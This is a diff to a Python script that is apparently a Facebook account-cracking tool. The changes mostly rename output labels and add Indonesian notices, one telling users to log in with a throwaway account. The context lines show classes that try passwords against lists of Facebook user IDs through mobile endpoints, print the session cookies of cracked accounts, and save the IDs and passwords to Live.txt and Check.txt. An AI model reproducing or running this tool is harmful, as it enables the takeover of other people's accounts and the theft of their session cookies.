@@ -39,6 +39,7 @@ mobile_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insec
 raka_sayang_amanda = '3882176535153442'
 def login():
 	os.system('clear')
+        jalan("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m NOTE : Dimohon Untuk Menggunakan Akun Tumbal Jangan Pake Akun Utama ..."); time.sleep(00.01)
 	print(logo)
 	print("\x1b[1;92m╔══◍➤®[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Login Using Facebook Token")
 	print("\x1b[1;92m╠══◍➤®[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m How to Get Facebook Token")
@@ -51,6 +52,7 @@ def login():
                 try:
 			token=raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Token  :\x1b[1;92m ")
                         jalan("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Please Wait ..."); time.sleep(00.01)
+                        jalan("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Proses Login Mohon Tunggu Sebentar ..."); time.sleep(00.01)
                         cek=requests.get('https://graph.facebook.com/me?access_token='+token)
                         y=json.loads(cek.text)
                         nama = y['name']
@@ -559,7 +561,7 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[ANGGA_OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					print("\r\x1b[1;92m💦[OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
 					self.ada.append("%s | %s"%(fl.get("id"),i))
 					if fl.get("id") in open("Live.txt").read():
 						break
@@ -578,7 +580,7 @@ class crack:
 					except (KeyError, IOError):
 		                         bt = "         "
 					except:pass
-					print("\r\x1b[1;96m[ANGGA_CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
+					print("\r\x1b[1;96m💦[CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
 					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
 					open("Check.txt","a+").write(
 						"%s|%s %s\n"%(fl.get("id"),i,bt))
@@ -586,8 +588,8 @@ class crack:
 				else:continue
 
 			self.ko+=1
-                        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
-			print "\r %s[</>] [%s/%s] [OK:%s] - [CP:%s]"%(rm,self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+                        raka = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
+			print "\r %s[</>] [%s/%s] [OK:%s] - [CP:%s]"%(raka,self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 class crack2:
@@ -665,7 +667,7 @@ class crack2:
 				log=free(fl.get("id"),
 					i,"https://free.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[ANGGA_OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					print("\r\x1b[1;92m💦[OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
 					self.ada.append("%s | %s"%(fl.get("id"),i))
 					if fl.get("id") in open("Live.txt").read():
 						break
@@ -684,7 +686,7 @@ class crack2:
 					except (KeyError, IOError):
 		                         bt = "         "
 					except:pass
-					print("\r\x1b[1;96m[ANGGA_CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
+					print("\r\x1b[1;96m💦[CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
 					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
 					open("Check.txt","a+").write(
 						"%s|%s %s\n"%(fl.get("id"),i,bt))
@@ -692,7 +694,8 @@ class crack2:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;967m[</>] [%s/%s] \x1b[1;92m[OK:%s] \x1b[1;97m- \x1b[1;96m[CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+                        raka = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
+			print "\r %s[</>] [%s/%s] [OK:%s] - [CP:%s]"%(raka,self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 class crack3:
@@ -770,7 +773,7 @@ class crack3:
 				log=mobile(fl.get("id"),
 					i,"https://m.facebook.com")
 				if log.get("status")=="success":
-					print("\r\x1b[1;92m[ANGGA_OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
+					print("\r\x1b[1;92m💦[OK] "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
 					self.ada.append("%s | %s"%(fl.get("id"),i))
 					if fl.get("id") in open("Live.txt").read():
 						break
@@ -789,7 +792,7 @@ class crack3:
 					except (KeyError, IOError):
 		                         bt = "         "
 					except:pass
-					print("\r\x1b[1;96m[ANGGA_CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
+					print("\r\x1b[1;96m💦[CP] "+(fl.get("id")+"|"+i+" "+bt+" "))
 					self.cp.append("%s|%s %s"%(fl.get("id"),i,bt))
 					open("Check.txt","a+").write(
 						"%s|%s %s\n"%(fl.get("id"),i,bt))
@@ -797,7 +800,8 @@ class crack3:
 				else:continue
 
 			self.ko+=1
-			print "\r\x1b[1;97m[</>] [%s/%s] \x1b[1;92m[OK:%s] \x1b[1;97m- \x1b[1;96m[CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+                        raka = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
+			print "\r %s[</>] [%s/%s] [OK:%s] - [CP:%s]"%(raka,self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
 		except:
 			self.main(fl)
 
